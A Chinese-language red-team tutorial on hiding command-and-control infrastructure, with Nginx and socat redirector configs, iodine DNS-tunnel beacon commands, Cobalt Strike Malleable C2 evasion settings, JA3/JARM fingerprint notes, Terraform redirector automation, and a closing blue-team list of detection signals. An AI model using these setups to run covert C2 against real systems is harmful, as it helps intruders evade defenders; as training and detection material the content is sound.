# 域前置与流量伪装

> 红队基础设施的高级隐蔽技术

---

## 1. 红队基础设施架构

```
                      互联网
                        │
                 ┌──────┴──────┐
                 │   重定向器    │  ← AWS Lightsail / Vultr VPS
                 │  (Socat/Nginx)│
                 └──────┬──────┘
                        │ (加密隧道)
                 ┌──────┴──────┐
                 │   C2 服务器   │  ← 不直接暴露
                 │ (Team Server) │
                 └──────────────┘
```

---

## 2. 重定向器配置

### Nginx 反向代理
```nginx
# 重定向器 Nginx 配置
server {
    listen 443 ssl;
    server_name cdn.example.com;

    # 合法应用的 SSL 证书
    ssl_certificate /etc/ssl/certs/example.com.pem;
    ssl_certificate_key /etc/ssl/private/example.com.key;

    location / {
        # 白名单: 仅允许团队 IP
        allow 192.168.1.0/24;
        deny all;

        proxy_pass https://10.0.0.5:443;  # C2 内网 IP
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

### Socat TCP 转发
```bash
# 端口转发 (TCP 443 → C2 443)
socat TCP-LISTEN:443,fork,reuseaddr TCP:10.0.0.5:443 &

# 带 IP 白名单的端口转发 (iptables)
iptables -A INPUT -p tcp --dport 443 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j DROP
```

---

## 3. DNS 隧道

```bash
# 服务端 (C2)
iodined -f -c -P 'StrongPassword' 10.0.0.1 tunnel.example.com

# 客户端 (Beacon)
iodine -f -P 'StrongPassword' tunnel.example.com
# 自动建立 TUN 接口 + DNS 隧道通信

# DNS Beacon 特性:
# - 仅需 DNS 解析 (UDP 53)，可穿透最严格的防火墙
# - 速度: 100 KB/s ~ 1 MB/s (取决于 DNS 响应大小)
# - TXT/MX 记录承载数据
# - 缺点: 大量 DNS 查询可能被 DNS 监控告警
```

---

## 4. 流量特征伪装

### JA3/JA4 指纹伪装
```python
# TLS 客户端指纹 (JA3)
# 通过 SSL/TLS 握手参数识别客户端
# 真实浏览器 JA3: 特定密码套件顺序
# C2 默认 JA3: Golang/Python 等库的特征指纹

# 绕过: 修改 TLS 库的密码套件顺序匹配真实浏览器
# Cobalt Strike: Malleable C2 配置
stage {
    set host_stage "false";  # 无阶段 Payload
    set userwx "false";      # RWX 内存检测绕过
    set cleanup "true";
}
```

### JARM 指纹
```bash
# 服务端 TLS 指纹扫描
git clone https://github.com/salesforce/jarm
python3 jarm.py example.com
# 结果: 2ad2ad... → 同一 TLS 栈的所有服务器共享相同指纹
```

---

## 5. C2 基础设施自动化

```python
# Terraform: 自动化重定向器部署
resource "aws_instance" "redirector" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t3.micro"

  user_data = <<-EOF
    #!/bin/bash
    apt-get update
    apt-get install -y nginx socat

    # 配置重定向
    cat > /etc/nginx/sites-available/c2 << 'NGINX'
    server {
        listen 443 ssl;
        server_name cdn.example.com;
        location / {
            allow ${var.team_ip_range};
            deny all;
            proxy_pass https://${var.c2_internal_ip}:443;
        }
    }
    NGINX

    ln -sf /etc/nginx/sites-available/c2 /etc/nginx/sites-enabled/
    systemctl restart nginx
  EOF

  tags = {
    Name = "c2-redirector-${count.index}"
  }
}
```

---

## 6. 防御检测点（蓝队视角）

```yaml
C2 基础设施检测信号:
  - 新注册域名 (创建时间 <30 天)
  - 域名与证书不匹配 (SNI ≠ Common Name)
  - JA3/JARM 指纹异常 (非服务器常见 TLS 栈)
  - 域名年龄短 + 突然出现的大量 DNS 查询
  - Let's Encrypt 短期证书 (90天)
  - ASN 归属低成本 VPS 提供商
  - 与已知恶意 IP/域名关联

  检测工具:
  - Shodan / Censys: JARM 指纹搜索
  - VirusTotal: 域名/IP 关联查询
  - urlscan.io: 页面特征分析
  - DomainTools: 域名注册信息分析
```

---

*上一篇：[C2 框架对比与选型](../red-team/04-c2-frameworks.md)*
